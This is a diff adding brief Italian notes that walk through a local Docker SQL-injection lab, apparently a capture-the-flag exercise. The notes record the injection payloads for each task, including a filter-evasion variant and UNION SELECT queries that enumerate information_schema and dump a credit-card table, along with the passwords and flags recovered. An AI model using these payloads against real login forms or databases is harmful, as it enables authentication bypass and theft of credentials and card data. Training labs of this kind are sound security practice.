@@ -1,0 +1,21 @@
+> starta docker
+> localhost:8080
+> task1: user=task1,  password=letmein
+> dopodiché, email=qualsiasi, password=' or 1=1 -- -
+< ricevi la password IVQQ9GyrPMuo1aGD
+> task2: user:task2,  password:IVQQ9GyrPMuo1aGD 
+> dopodiché, email=qualsiasi,  password='/**/oorr/**/1=1#
+< GZOntyu4yJ1FjkEl
+> task3: user:task2,  password:GZOntyu4yJ1FjkEl 
+> dopodiché: ' or 1=1 -- -
+> ' or 1=1 union select 1,1,password from people #
+< task4_password_is{F9NCcGgVufau4SwR}
+> task4 stessa roba, questi step:
+> ' or 1=1 union select 1,1,table_name from information_schema.tables #
+> maybe creditcards or user
+' or 1=1 union select 1,1,column_name from information_schema.columns where table_name = 'creditcards' #
+> creditcards columns: id, mail, cctype, ccnumber, cvv, expiration_date
+> ' or 1=1 union select cctype,ccnumber,cvv from creditcards #
+<  FLAG{OMG_Th3r3_1s_4_fl4g_h3r3!},
+
+
